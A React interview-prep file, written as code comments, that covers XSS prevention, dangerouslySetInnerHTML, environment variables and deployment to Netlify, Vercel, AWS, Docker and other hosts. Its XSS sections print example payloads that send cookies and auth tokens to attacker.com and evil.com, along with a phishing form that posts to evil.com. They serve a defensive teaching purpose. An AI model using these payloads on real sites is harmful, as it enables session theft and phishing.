/*

========================================================
SECTION 14 — SECURITY, DEPLOYMENT & REAL-WORLD USAGE
========================================================
103. What is Cross-Site Scripting (XSS) in React and how do you prevent it?  
104. What is dangerouslySetInnerHTML and why should you avoid it?  
105. What are environment variables in React?  
106. How do you deploy a React app? (Netlify, Vercel, AWS, etc.)  
107. What is code splitting and lazy loading in React?  
108. What is tree shaking in React apps?  

*/



/**
103. What is Cross-Site Scripting (XSS) in React and how do you prevent it?
---------------------------------------------------------------------------

Cross-Site Scripting (XSS) is a security vulnerability where attackers inject
malicious scripts into web pages. React has built-in protection, but there
are still ways to introduce XSS vulnerabilities if you're not careful.

What is XSS:
------------

// XSS occurs when untrusted data is inserted into the DOM
// Attacker injects malicious code that executes in victim's browser

// Example attack:
// User enters: <img src="x" onerror="alert('XSS!')">
// If rendered as HTML, the script executes
// Attacker can steal cookies, tokens, or perform actions as user

React's Built-in XSS Protection:
---------------------------------

// React escapes values by default [web:182][web:185]
function Component() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  // ✅ SAFE - React escapes the string [web:182][web:185]
  return <div>{userInput}</div>;
  
  // Rendered as text, not HTML:
  // <div>&lt;img src="x" onerror="alert('XSS')"&gt;</div>
}

// React automatically escapes:
// - Text content in JSX
// - Attribute values
// This prevents XSS through normal data binding [web:182]

XSS Vulnerabilities in React:
------------------------------

// 1. dangerouslySetInnerHTML (DANGEROUS!)
function Vulnerable() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  // ❌ VULNERABLE - Renders as HTML [web:181]
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  
  // Script executes! User compromised!
}

// 2. href with javascript: protocol [web:181][web:183]
function VulnerableLink() {
  const userUrl = "javascript:alert('XSS')";
  
  // ❌ VULNERABLE - Executes JavaScript
  return <a href={userUrl}>Click me</a>;
}

// 3. Creating elements from user input
function VulnerableElement() {
  const userTag = 'img';
  const userProps = { src: 'x', onerror: 'alert("XSS")' };
  
  // ❌ VULNERABLE
  return React.createElement(userTag, userProps);
}

// 4. eval or Function constructor [web:183]
function VulnerableCode() {
  const userCode = 'alert("XSS")';
  
  // ❌ NEVER DO THIS
  eval(userCode);
  new Function(userCode)();
}

// 5. Inline event handlers from user input [web:183]
function VulnerableHandler() {
  const userHandler = 'alert("XSS")';
  
  // ❌ VULNERABLE
  return <button onClick={eval(userHandler)}>Click</button>;
}

XSS Prevention Strategies:
---------------------------

// 1. Use JSX data binding (default protection) [web:185]
function Safe() {
  const userInput = '<script>alert("XSS")</script>';
  
  // ✅ SAFE - React escapes [web:182][web:185]
  return <div>{userInput}</div>;
  
  // Renders as text, not executable
}

// 2. Sanitize HTML before using dangerouslySetInnerHTML [web:181][web:183]
import DOMPurify from 'dompurify';

function SafeHTML() {
  const userHTML = '<img src="x" onerror="alert(\'XSS\')">';
  
  // ✅ SAFE - Sanitized [web:181][web:183]
  const cleanHTML = DOMPurify.sanitize(userHTML);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
  
  // DOMPurify removes malicious code
  // Result: <img src="x">
}

// 3. Validate URLs [web:181][web:183]
function SafeLink() {
  const userUrl = "javascript:alert('XSS')";
  
  // ✅ SAFE - Validate protocol [web:183]
  const isValidUrl = (url) => {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  };
  
  return (
    <a href={isValidUrl(userUrl) ? userUrl : '#'}>
      Click me
    </a>
  );
}

// Better: Use allowlist [web:183]
function SaferLink({ url }) {
  const safeUrl = url.startsWith('http://') || url.startsWith('https://')
    ? url
    : `https://${url}`;
  
  return <a href={safeUrl}>Link</a>;
}

// 4. Never use eval or Function [web:183]
function Safe() {
  const userCode = 'malicious code';
  
  // ❌ NEVER
  // eval(userCode);
  // new Function(userCode)();
  
  // ✅ Use safe alternatives
  // - JSON.parse for data
  // - Proper event handlers for functions
}

// 5. Use safe alternatives to dangerouslySetInnerHTML
import ReactMarkdown from 'react-markdown';

function SafeMarkdown() {
  const userMarkdown = '# Hello\n[Click](javascript:alert("XSS"))';
  
  // ✅ SAFE - ReactMarkdown sanitizes [web:183]
  return (
    <ReactMarkdown
      components={{
        // Customize rendering
        a: ({node, ...props}) => {
          // Only allow safe URLs
          if (props.href.startsWith('http')) {
            return <a {...props} />;
          }
          return <span>{props.children}</span>;
        }
      }}
    >
      {userMarkdown}
    </ReactMarkdown>
  );
}

Content Security Policy (CSP):
-------------------------------

// Add CSP headers to prevent XSS [web:181][web:183]

// Server configuration (Express example):
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'"
  );
  next();
});

// Or in HTML meta tag:
// <meta http-equiv="Content-Security-Policy" 
//       content="default-src 'self'; script-src 'self'">

// CSP prevents:
// - Inline scripts [web:183]
// - eval() execution
// - External script loading from untrusted sources

Input Validation and Sanitization:
-----------------------------------

// 1. Server-side validation (primary defense) [web:181]
// ALWAYS validate on server, never trust client

// 2. Client-side validation (user experience)
function CommentForm() {
  const [comment, setComment] = useState('');
  const [error, setError] = useState('');
  
  const validateComment = (value) => {
    // Check for suspicious patterns
    const suspiciousPatterns = [
      /<script/i,
      /javascript:/i,
      /onerror=/i,
      /onclick=/i,
      /onload=/i
    ];
    
    for (const pattern of suspiciousPatterns) {
      if (pattern.test(value)) {
        return 'Invalid input detected';
      }
    }
    
    return '';
  };
  
  const handleChange = (e) => {
    const value = e.target.value;
    setComment(value);
    setError(validateComment(value));
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    const validationError = validateComment(comment);
    if (validationError) {
      setError(validationError);
      return;
    }
    
    // Still validate on server!
    submitComment(comment);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={handleChange}
        placeholder="Enter comment"
      />
      {error && <div className="error">{error}</div>}
      <button type="submit" disabled={!!error}>
        Submit
      </button>
    </form>
  );
}

// 3. Whitelist approach [web:183]
function SafeInput() {
  const [input, setInput] = useState('');
  
  const sanitizeInput = (value) => {
    // Only allow alphanumeric and basic punctuation
    return value.replace(/[^a-zA-Z0-9\s.,!?-]/g, '');
  };
  
  const handleChange = (e) => {
    setInput(sanitizeInput(e.target.value));
  };
  
  return <input value={input} onChange={handleChange} />;
}

Real-World Example - Blog Comments:
------------------------------------

import DOMPurify from 'dompurify';

function Comment({ text, author, html }) {
  // ✅ SAFE - Plain text rendered safely
  return (
    <div className="comment">
      <div className="author">{author}</div>
      <div className="text">{text}</div>
    </div>
  );
}

function RichComment({ html, author }) {
  // For rich text (Markdown, WYSIWYG editors)
  
  // ✅ SAFE - Sanitize before rendering [web:181][web:183]
  const sanitizedHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_URI_REGEXP: /^https?:\/\//  // Only http/https
  });
  
  return (
    <div className="comment">
      <div className="author">{author}</div>
      <div
        className="text"
        dangerouslySetInnerHTML={{ __html: sanitizedHTML }}
      />
    </div>
  );
}

function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <Comment
          key={comment.id}
          text={comment.text}
          author={comment.author}
        />
      ))}
    </div>
  );
}

Best Practices Checklist:
--------------------------

// ✅ DO:
// 1. Use JSX data binding by default [web:185]
<div>{userInput}</div>

// 2. Sanitize HTML with DOMPurify [web:181][web:183]
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

// 3. Validate URLs [web:183]
const safeUrl = validateUrl(userUrl);

// 4. Use CSP headers [web:181][web:183]
Content-Security-Policy: default-src 'self'

// 5. Validate input (client and server) [web:181]
if (!validateInput(data)) return;

// 6. Use safe libraries (ReactMarkdown, etc.) [web:183]

// ❌ DON'T:
// 1. Never use dangerouslySetInnerHTML with unsanitized input [web:181]
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // NEVER!

// 2. Never use eval or Function [web:183]
eval(userCode);  // NEVER!

// 3. Don't trust client-side validation alone [web:181]
// Always validate on server

// 4. Don't allow javascript: URLs [web:181][web:183]
<a href={userUrl}>  // Validate first!

// 5. Don't create elements from user input
React.createElement(userTag, userProps);  // NEVER!

Summary:

XSS in React:
- React escapes by default [web:182][web:185]
- Still vulnerable with dangerouslySetInnerHTML [web:181]
- Validate and sanitize user input [web:181][web:183]
- Use DOMPurify for HTML [web:181][web:183]
- Validate URLs [web:183]
- Never use eval [web:183]
- Implement CSP headers [web:181][web:183]
- Always validate server-side [web:181]
*/


/**
104. What is dangerouslySetInnerHTML and why should you avoid it?
----------------------------------------------------------------

dangerouslySetInnerHTML is React's replacement for innerHTML in the DOM.
It allows you to set HTML directly from React, but the name warns you
of the security risks involved.

What is dangerouslySetInnerHTML:
---------------------------------

// React's way to set innerHTML [web:181]
function Component() {
  const htmlString = '<p>Hello <strong>World</strong></p>';
  
  // Setting HTML directly
  return (
    <div dangerouslySetInnerHTML={{ __html: htmlString }} />
  );
  
  // Renders as HTML:
  // <div>
  //   <p>Hello <strong>World</strong></p>
  // </div>
}

// Must use object with __html key
// The awkward syntax is intentional - makes you think twice!

Why It's Called "Dangerous":
-----------------------------

// It bypasses React's XSS protection [web:181][web:182]

// Safe (normal JSX):
function Safe() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  return <div>{userInput}</div>;
  
  // React escapes it:
  // <div>&lt;img src="x" onerror="alert('XSS')"&gt;</div>
  // Shown as text, not executed
}

// Dangerous:
function Dangerous() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  
  // Renders as actual HTML:
  // <div><img src="x" onerror="alert('XSS')"></div>
  // Script EXECUTES! ⚠️
}

Security Risks:
---------------

// 1. XSS Attacks [web:181]
function VulnerableComponent({ commentHTML }) {
  // If commentHTML comes from user input...
  // ❌ VULNERABLE
  return <div dangerouslySetInnerHTML={{ __html: commentHTML }} />;
  
  // Attacker can inject:
  // <script>
  //   // Steal cookies
  //   fetch('https://attacker.com/steal', {
  //     method: 'POST',
  //     body: document.cookie
  //   });
  // </script>
  
  // Or:
  // <img src="x" onerror="
  //   fetch('/api/delete-account', { method: 'DELETE' })
  // ">
}

// 2. Session Hijacking
function Comment({ html }) {
  // ❌ DANGEROUS
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  
  // Attacker injects:
  // <script>
  //   const token = localStorage.getItem('auth-token');
  //   fetch('https://evil.com/steal?token=' + token);
  // </script>
}

// 3. Phishing
function Article({ content }) {
  // ❌ DANGEROUS
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
  
  // Attacker injects fake login form:
  // <form action="https://evil.com/phish" method="POST">
  //   <input name="password" placeholder="Re-enter password">
  //   <button>Continue</button>
  // </form>
}

When You Might Need It:
-----------------------

// 1. Rendering HTML from trusted CMS
function CMSContent({ html }) {
  // If HTML comes from trusted admin-only CMS
  // Still sanitize! [web:181]
  const cleanHTML = DOMPurify.sanitize(html);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// 2. Rendering sanitized Markdown
function MarkdownContent({ markdown }) {
  // Convert markdown to HTML
  const html = marked(markdown);
  
  // Sanitize [web:181]
  const cleanHTML = DOMPurify.sanitize(html);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// 3. Embedding third-party widgets
function YouTubeEmbed({ videoId }) {
  const embedHTML = `
    <iframe
      width="560"
      height="315"
      src="https://www.youtube.com/embed/${videoId}"
      frameborder="0"
      allowfullscreen
    ></iframe>
  `;
  
  return <div dangerouslySetInnerHTML={{ __html: embedHTML }} />;
}

Safe Alternatives:
------------------

// 1. Use JSX instead [web:185]
// ❌ Don't do this:
function Bad() {
  const html = '<p>Hello <strong>World</strong></p>';
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Do this:
function Good() {
  return (
    <div>
      <p>Hello <strong>World</strong></p>
    </div>
  );
}

// 2. Use React components for rich text
// ❌ Don't do this:
function BlogPost({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Do this:
import ReactMarkdown from 'react-markdown';

function BlogPost({ markdown }) {
  return <ReactMarkdown>{markdown}</ReactMarkdown>;
}

// 3. Parse and render safely
// ❌ Don't do this:
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Do this:
import parse from 'html-react-parser';

function Comment({ html }) {
  // Parses HTML to React elements
  return <div>{parse(html)}</div>;
}

Proper Sanitization:
--------------------

// Always sanitize before using dangerouslySetInnerHTML [web:181][web:183]

import DOMPurify from 'dompurify';

// Basic sanitization
function SafeHTML({ html }) {
  const cleanHTML = DOMPurify.sanitize(html);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// Custom sanitization options [web:181]
function CustomSanitizedHTML({ html }) {
  const cleanHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    ALLOWED_URI_REGEXP: /^https?:\/\//  // Only http/https URLs
  });
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// Strict sanitization (text only)
function TextOnly({ html }) {
  const textOnly = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [],  // No HTML tags
    ALLOWED_ATTR: []
  });
  
  return <div dangerouslySetInnerHTML={{ __html: textOnly }} />;
}

// Remove all scripts and event handlers [web:183]
function NoScripts({ html }) {
  const safe = DOMPurify.sanitize(html, {
    FORBID_TAGS: ['script', 'style'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: safe }} />;
}

Real-World Example - Rich Text Editor:
---------------------------------------

import DOMPurify from 'dompurify';

function RichTextEditor() {
  const [content, setContent] = useState('');
  const [preview, setPreview] = useState('');
  
  const handleChange = (e) => {
    const value = e.target.value;
    setContent(value);
    
    // Sanitize for preview [web:181]
    const sanitized = DOMPurify.sanitize(value, {
      ALLOWED_TAGS: [
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
        'ul', 'ol', 'li', 'a', 'blockquote', 'code', 'pre'
      ],
      ALLOWED_ATTR: ['href', 'title'],
      ALLOWED_URI_REGEXP: /^https?:\/\//
    });
    
    setPreview(sanitized);
  };
  
  const handleSubmit = async () => {
    // Sanitize again before sending to server [web:181]
    const sanitized = DOMPurify.sanitize(content);
    
    await fetch('/api/posts', {
      method: 'POST',
      body: JSON.stringify({ content: sanitized }),
      headers: { 'Content-Type': 'application/json' }
    });
  };
  
  return (
    <div>
      <textarea
        value={content}
        onChange={handleChange}
        placeholder="Write your post..."
      />
      
      <div className="preview">
        <h3>Preview:</h3>
        <div dangerouslySetInnerHTML={{ __html: preview }} />
      </div>
      
      <button onClick={handleSubmit}>Publish</button>
    </div>
  );
}

Testing for XSS:
----------------

// Test your sanitization
describe('HTML Sanitization', () => {
  it('removes script tags', () => {
    const malicious = '<script>alert("XSS")</script><p>Hello</p>';
    const clean = DOMPurify.sanitize(malicious);
    
    expect(clean).not.toContain('<script>');
    expect(clean).toContain('<p>Hello</p>');
  });
  
  it('removes event handlers', () => {
    const malicious = '<img src="x" onerror="alert(\'XSS\')">';
    const clean = DOMPurify.sanitize(malicious);
    
    expect(clean).not.toContain('onerror');
  });
  
  it('removes javascript: URLs', () => {
    const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
    const clean = DOMPurify.sanitize(malicious);
    
    expect(clean).not.toContain('javascript:');
  });
  
  it('allows safe HTML', () => {
    const safe = '<p>Hello <strong>World</strong></p>';
    const clean = DOMPurify.sanitize(safe);
    
    expect(clean).toBe(safe);
  });
});

Best Practices:
---------------

// 1. Avoid if possible [web:181]
// Use JSX or safe libraries instead

// 2. Always sanitize [web:181][web:183]
const clean = DOMPurify.sanitize(html);
<div dangerouslySetInnerHTML={{ __html: clean }} />

// 3. Use strict allowlist [web:183]
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'strong', 'em'],
  ALLOWED_ATTR: []
});

// 4. Never trust user input [web:181]
// Even from authenticated users

// 5. Sanitize on server too [web:181]
// Defense in depth

// 6. Use Content Security Policy [web:183]
// Additional protection layer

// 7. Regular security audits
// Test for XSS vulnerabilities

Why Avoid It:
-------------

// 1. Security risk [web:181]
// XSS attacks can steal data, hijack sessions

// 2. React protection bypassed [web:182]
// Lose React's automatic escaping

// 3. Hard to maintain
// Easy to forget sanitization

// 4. Better alternatives exist
// ReactMarkdown, html-react-parser, etc.

// 5. Performance
// Parsing HTML is slower than JSX

// 6. Accessibility
// Harder to ensure semantic HTML

Summary:

dangerouslySetInnerHTML:
- React's innerHTML equivalent
- Bypasses XSS protection [web:181][web:182]
- Name warns of danger
- Use only when necessary
- Always sanitize with DOMPurify [web:181][web:183]
- Prefer safe alternatives [web:185]
- Never trust user input [web:181]
- Use strict allowlists [web:183]
- Test for XSS vulnerabilities
*/


/**
105. What are environment variables in React?
--------------------------------------------

Environment variables are external configuration values used to store settings
that differ between development, staging, and production environments without
changing code. In React (Create React App), they must be prefixed with
REACT_APP_.

Basic Environment Variables:
-----------------------------

// .env file in project root
REACT_APP_API_URL=https://api.example.com
REACT_APP_API_KEY=your-api-key-here
REACT_APP_ENVIRONMENT=development

// Access in React code
function App() {
  const apiUrl = process.env.REACT_APP_API_URL;
  const apiKey = process.env.REACT_APP_API_KEY;
  const env = process.env.REACT_APP_ENVIRONMENT;
  
  console.log('API URL:', apiUrl);
  console.log('Environment:', env);
  
  return <div>Environment: {env}</div>;
}

// Important: Must start with REACT_APP_
// REACT_APP_MY_VAR ✅ Works
// MY_VAR ❌ Doesn't work

Different Environment Files:
-----------------------------

// .env - Default, loaded in all environments
REACT_APP_APP_NAME=My App

// .env.local - Local overrides, ignored by git
REACT_APP_API_KEY=dev-key-12345

// .env.development - Development only
REACT_APP_API_URL=http://localhost:3001
REACT_APP_DEBUG=true

// .env.production - Production only
REACT_APP_API_URL=https://api.production.com
REACT_APP_DEBUG=false

// .env.test - Test environment
REACT_APP_API_URL=http://localhost:3001
REACT_APP_DEBUG=false

// Priority (highest to lowest):
// 1. .env.local
// 2. .env.development / .env.production / .env.test
// 3. .env

Common Use Cases:
-----------------

// 1. API URLs
const API_URL = process.env.REACT_APP_API_URL;

function fetchUsers() {
  return fetch(`${API_URL}/users`);
}

// Development: http://localhost:3001/users
// Production: https://api.production.com/users

// 2. Feature flags
const ENABLE_ANALYTICS = process.env.REACT_APP_ENABLE_ANALYTICS === 'true';

function App() {
  useEffect(() => {
    if (ENABLE_ANALYTICS) {
      initializeAnalytics();
    }
  }, []);
  
  return <div>App</div>;
}

// 3. API keys (external services)
const GOOGLE_MAPS_KEY = process.env.REACT_APP_GOOGLE_MAPS_KEY;

function Map() {
  return (
    <GoogleMap apiKey={GOOGLE_MAPS_KEY}>
      {/* Map content * /}
    </GoogleMap>
  );
}

// 4. Environment-specific behavior
const IS_DEV = process.env.NODE_ENV === 'development';
const IS_PROD = process.env.NODE_ENV === 'production';

function logger(message) {
  if (IS_DEV) {
    console.log(message);
  }
  
  if (IS_PROD) {
    sendToLogService(message);
  }
}

// 5. Build-time configuration
const VERSION = process.env.REACT_APP_VERSION || '1.0.0';
const BUILD_DATE = process.env.REACT_APP_BUILD_DATE;

function Footer() {
  return (
    <footer>
      Version {VERSION} - Built on {BUILD_DATE}
    </footer>
  );
}

Configuration Module Pattern:
------------------------------

// config.js
const config = {
  apiUrl: process.env.REACT_APP_API_URL,
  apiKey: process.env.REACT_APP_API_KEY,
  environment: process.env.REACT_APP_ENVIRONMENT,
  features: {
    analytics: process.env.REACT_APP_ENABLE_ANALYTICS === 'true',
    betaFeatures: process.env.REACT_APP_BETA_FEATURES === 'true',
  },
  external: {
    googleMapsKey: process.env.REACT_APP_GOOGLE_MAPS_KEY,
    stripeKey: process.env.REACT_APP_STRIPE_KEY,
  }
};

export default config;

// Usage
import config from './config';

function App() {
  const { apiUrl, features } = config;
  
  useEffect(() => {
    if (features.analytics) {
      setupAnalytics();
    }
  }, []);
  
  return <div>API: {apiUrl}</div>;
}

Vite Environment Variables:
----------------------------

// Vite uses different prefix: VITE_

// .env
VITE_API_URL=https://api.example.com
VITE_API_KEY=your-key

// Access in code
function App() {
  const apiUrl = import.meta.env.VITE_API_URL;
  const apiKey = import.meta.env.VITE_API_KEY;
  const mode = import.meta.env.MODE; // 'development' or 'production'
  const isDev = import.meta.env.DEV; // boolean
  const isProd = import.meta.env.PROD; // boolean
  
  return <div>API: {apiUrl}</div>;
}

Security Considerations:
------------------------

// ⚠️ IMPORTANT: Environment variables are PUBLIC

// ❌ NEVER store secrets in React env vars
REACT_APP_DATABASE_PASSWORD=secret123  // ❌ EXPOSED IN BUNDLE!
REACT_APP_PRIVATE_KEY=abc123  // ❌ EXPOSED IN BUNDLE!

// Why? They're embedded in JavaScript bundle
// Anyone can read them in browser DevTools

// ✅ DO: Store non-sensitive config
REACT_APP_API_URL=https://api.example.com  // ✅ OK
REACT_APP_GOOGLE_MAPS_KEY=public-key  // ✅ OK (public API key)

// ✅ DO: Keep secrets on server
// Create API endpoint that uses secret server-side
// React calls endpoint, server uses secret

// Example: Stripe payments
// ❌ Bad: Expose secret key
const STRIPE_SECRET = process.env.REACT_APP_STRIPE_SECRET; // NEVER!

// ✅ Good: Use publishable key in React
const STRIPE_PUBLIC = process.env.REACT_APP_STRIPE_PUBLIC; // OK

// Server handles secret key
// POST /api/create-payment-intent
app.post('/api/create-payment-intent', async (req, res) => {
  const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
  // Use secret key server-side only
});

.gitignore Setup:
-----------------

// .gitignore
.env.local
.env.*.local

// Commit to git:
.env  // ✅ Template with dummy values
.env.development  // ✅ Safe development defaults
.env.production  // ✅ Safe production defaults (no secrets)

// Don't commit:
.env.local  // ❌ Contains actual keys/secrets

// .env (committed template)
REACT_APP_API_URL=
REACT_APP_GOOGLE_MAPS_KEY=

// .env.local (not committed, actual values)
REACT_APP_API_URL=https://api.example.com
REACT_APP_GOOGLE_MAPS_KEY=actual-key-here

TypeScript with Environment Variables:
---------------------------------------

// vite-env.d.ts or env.d.ts
interface ImportMetaEnv {
  readonly VITE_API_URL: string;
  readonly VITE_API_KEY: string;
  readonly VITE_ENVIRONMENT: 'development' | 'staging' | 'production';
}

interface ImportMeta {
  readonly env: ImportMetaEnv;
}

// Now get type checking
const apiUrl: string = import.meta.env.VITE_API_URL; // Type-safe!

// For Create React App
declare namespace NodeJS {
  interface ProcessEnv {
    REACT_APP_API_URL: string;
    REACT_APP_API_KEY: string;
    NODE_ENV: 'development' | 'production' | 'test';
  }
}

// Usage with type safety
const apiUrl: string = process.env.REACT_APP_API_URL;

Validation:
-----------

// Validate required environment variables
function validateEnv() {
  const required = [
    'REACT_APP_API_URL',
    'REACT_APP_API_KEY'
  ];
  
  const missing = required.filter(key => !process.env[key]);
  
  if (missing.length > 0) {
    throw new Error(
      `Missing required environment variables: ${missing.join(', ')}`
    );
  }
}

// Call at app startup
validateEnv();

// Or use a library
import { z } from 'zod';

const envSchema = z.object({
  REACT_APP_API_URL: z.string().url(),
  REACT_APP_API_KEY: z.string().min(10),
  REACT_APP_ENVIRONMENT: z.enum(['development', 'staging', 'production'])
});

const env = envSchema.parse(process.env);

CI/CD Environment Variables:
-----------------------------

// GitHub Actions
// .github/workflows/deploy.yml
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build
        env:
          REACT_APP_API_URL: ${{ secrets.API_URL }}
          REACT_APP_API_KEY: ${{ secrets.API_KEY }}
        run: npm run build

// Netlify
// Set in Netlify dashboard or netlify.toml
[build.environment]
  REACT_APP_API_URL = "https://api.example.com"

// Vercel
// Set in Vercel dashboard or vercel.json
{
  "env": {
    "REACT_APP_API_URL": "https://api.example.com"
  }
}

Summary:

Environment Variables:
- Store configuration outside code
- Different values per environment
- Must prefix with REACT_APP_ (CRA) or VITE_ (Vite)
- Access via process.env or import.meta.env
- Embedded in JavaScript bundle (not secret!)
- Never store sensitive data
- Use .env.local for local secrets
- Validate at startup
- Set in CI/CD for deployment
*/


/**
106. How do you deploy a React app? (Netlify, Vercel, AWS, etc.)
----------------------------------------------------------------

React apps can be deployed to various platforms. The process typically involves
building the app to static files and serving them from a web server or CDN.

Build Process:
--------------

// 1. Build React app
npm run build

// Creates 'build' folder with:
build/
  index.html
  static/
    css/
      main.[hash].css
    js/
      main.[hash].js
    media/
      logo.[hash].png

// Optimized production files:
// - Minified JavaScript
// - Compressed CSS
// - Optimized images
// - Source maps (optional)

// 2. Test build locally
npx serve -s build

// 3. Deploy build folder to hosting platform

Netlify Deployment:
-------------------

// Method 1: Drag and Drop
// 1. Go to netlify.com
// 2. Drag 'build' folder to deploy area
// 3. Done! Gets URL like: https://random-name.netlify.app

// Method 2: Git Integration (Recommended)
// 1. Push code to GitHub
// 2. Connect repository in Netlify dashboard
// 3. Configure build settings:
//    - Build command: npm run build
//    - Publish directory: build
// 4. Auto-deploys on git push!

// netlify.toml (optional configuration)
[build]
  command = "npm run build"
  publish = "build"

[build.environment]
  REACT_APP_API_URL = "https://api.example.com"

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200  # SPA redirect

// Method 3: Netlify CLI
npm install -g netlify-cli

// Login
netlify login

// Deploy
netlify deploy --prod

Vercel Deployment:
------------------

// Method 1: Vercel CLI
npm install -g vercel

// Login
vercel login

// Deploy
vercel

// Production deploy
vercel --prod

// Method 2: Git Integration (Recommended)
// 1. Push to GitHub
// 2. Import project in Vercel dashboard
// 3. Auto-deploys on push!

// vercel.json (optional)
{
  "buildCommand": "npm run build",
  "outputDirectory": "build",
  "devCommand": "npm start",
  "rewrites": [
    { "source": "/(.*)", "destination": "/" }
  ]
}

// Environment variables
// Set in Vercel dashboard:
// Settings > Environment Variables
REACT_APP_API_URL=https://api.example.com

// Or via CLI
vercel env add REACT_APP_API_URL production

GitHub Pages:
-------------

// 1. Install gh-pages
npm install --save-dev gh-pages

// 2. Add homepage to package.json
{
  "homepage": "https://username.github.io/repository-name",
  "scripts": {
    "predeploy": "npm run build",
    "deploy": "gh-pages -d build",
    "start": "react-scripts start",
    "build": "react-scripts build"
  }
}

// 3. Deploy
npm run deploy

// Creates gh-pages branch and deploys
// Available at: https://username.github.io/repository-name

// For custom domain:
// 1. Add CNAME file in public folder
echo "yourdomain.com" > public/CNAME

// 2. Configure DNS:
// A record: 185.199.108.153
// A record: 185.199.109.153
// A record: 185.199.110.153
// A record: 185.199.111.153

AWS S3 + CloudFront:
--------------------

// 1. Create S3 bucket
aws s3 mb s3://my-react-app

// 2. Configure bucket for static website
aws s3 website s3://my-react-app --index-document index.html --error-document index.html

// 3. Build app
npm run build

// 4. Upload build folder
aws s3 sync build/ s3://my-react-app --acl public-read

// 5. Create CloudFront distribution
// - Origin: S3 bucket
// - Default Root Object: index.html
// - Custom Error Responses: 404 → /index.html (for SPA routing)

// Automate with script:
#!/bin/bash
npm run build
aws s3 sync build/ s3://my-react-app --delete
aws cloudfront create-invalidation --distribution-id YOUR_DIST_ID --paths "/*"

// Or use AWS Amplify (easier)
npm install -g @aws-amplify/cli

amplify init
amplify add hosting
amplify publish

Docker Deployment:
------------------

// Dockerfile
# Build stage
FROM node:18-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage
FROM nginx:alpine
COPY --from=build /app/build /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]

// nginx.conf (for SPA routing)
server {
    listen 80;
    location / {
        root /usr/share/nginx/html;
        index index.html;
        try_files $uri $uri/ /index.html;
    }
}

// Build and run
docker build -t my-react-app .
docker run -p 80:80 my-react-app

// Deploy to Docker Hub
docker tag my-react-app username/my-react-app
docker push username/my-react-app

Firebase Hosting:
-----------------

// 1. Install Firebase CLI
npm install -g firebase-tools

// 2. Login
firebase login

// 3. Initialize
firebase init hosting

// Select options:
// - Public directory: build
// - Single-page app: Yes
// - Automatic builds with GitHub: Optional

// 4. Build app
npm run build

// 5. Deploy
firebase deploy

// firebase.json
{
  "hosting": {
    "public": "build",
    "ignore": ["firebase.json", "** /.*", "** /node_modules/**"],
    "rewrites": [
      {
        "source": "**",
        "destination": "/index.html"
      }
    ]
  }
}

Heroku Deployment:
------------------

// 1. Create server.js (serve static files)
const express = require('express');
const path = require('path');
const app = express();

app.use(express.static(path.join(__dirname, 'build')));

app.get('/*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));

// 2. Update package.json
{
  "scripts": {
    "start": "node server.js",
    "build": "react-scripts build",
    "heroku-postbuild": "npm run build"
  },
  "engines": {
    "node": "18.x"
  }
}

// 3. Create Procfile
web: node server.js

// 4. Deploy
heroku create my-react-app
git push heroku main

DigitalOcean App Platform:
---------------------------

// 1. Push to GitHub
// 2. Create app in DigitalOcean dashboard
// 3. Select repository
// 4. Configure:
//    - Type: Static Site
//    - Build Command: npm run build
//    - Output Directory: build
// 5. Deploy!

// .do/app.yaml (optional)
name: my-react-app
static_sites:
  - name: frontend
    build_command: npm run build
    output_dir: build
    routes:
      - path: /
    environment_slug: node-js

Comparison:
-----------

